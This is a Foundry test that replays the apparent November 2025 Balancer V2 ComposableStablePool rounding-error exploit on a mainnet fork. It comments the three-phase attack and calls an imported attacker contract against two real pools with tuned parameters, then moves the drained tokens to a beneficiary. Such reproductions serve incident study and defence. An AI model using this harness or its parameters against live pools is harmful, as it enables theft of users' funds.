//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ForkUtils} from "../utils/ForkUtils.t.sol";
import {
    Attacker,
    Helper,
    IBalancerVault,
    IComposableStablePool,
    IERC20
} from "../../src/balancer2025/BalancerExploit.sol";

/**
 * @notice Balancer V2 ComposableStablePool Exploit Test - November 2025
 * @dev Attack Steps:
 *      1. Phase 1: Drain reserves geometrically (22 swaps, reduce balances from 4.87e24 to ~50 wei)
 *      2. Phase 2: Exploit rounding bug with carefully calculated trickAmt=17 (30 loops, each causing invariant decrease)
 *      3. Phase 3: Extract profit exponentially as virtual price crashes (1e4 â†’ 1e22)
 * @dev Root Cause: _upscale() uses mulDown causing amountOut to be rounded down, breaking pool invariant
 */
contract BalancerExploit is Test, ForkUtils {
    // Contract addresses
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant osETH_wETH = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant wstETH_wETH = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant osToken = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant attacker = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
    address constant beneficiary = 0xAa760D53541d8390074c61DEFeaba314675b8e3f;
    uint256 constant BLOCK_NUMBER = 23_717_397; // attack block number

    function setUp() public {
        // Setup fork at block before attack
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork("Balancer2025", rpcUrl, BLOCK_NUMBER - 1);
        selectFork("Balancer2025");
    }

    // Test demonstrates funds drained through rounding error exploitation in GIVEN_OUT swaps
    function testBalancerPoC() public {
        // Log initial balances
        console.log("weth balance of beneficiary before attack: ", IERC20(weth).balanceOf(beneficiary) / 1e18);
        console.log(
            "osETH_wETH balance of beneficiary before attack: ", IERC20(osETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log(
            "wstETH_wETH balance of beneficiary before attack: ", IERC20(wstETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log("osToken balance of beneficiary before attack: ", IERC20(osToken).balanceOf(beneficiary) / 1e18);
        console.log("wstETH balance of beneficiary before attack: ", IERC20(wstETH).balanceOf(beneficiary) / 1e18);

        // Deploy attacker contract
        Attacker attacker = new Attacker();
        // Execute exploit on osETH/wETH pool
        attacker.attack(osETH_wETH, 67000, 30); // offline computing numbers
        attacker.withdraw(osETH_wETH, beneficiary);

        // Execute exploit on wstETH/wETH pool
        attacker.attack(wstETH_wETH, 100000000000, 25); // offline computing numbers
        attacker.withdraw(wstETH_wETH, beneficiary);

        // Log final balances
        console.log("weth balance of beneficiary after attack: ", IERC20(weth).balanceOf(beneficiary) / 1e18);
        console.log(
            "osETH_wETH balance of beneficiary after attack: ", IERC20(osETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log(
            "wstETH_wETH balance of beneficiary after attack: ", IERC20(wstETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log("osToken balance of beneficiary after attack: ", IERC20(osToken).balanceOf(beneficiary) / 1e18);
        console.log("wstETH balance of beneficiary after attack: ", IERC20(wstETH).balanceOf(beneficiary) / 1e18);
    }
}
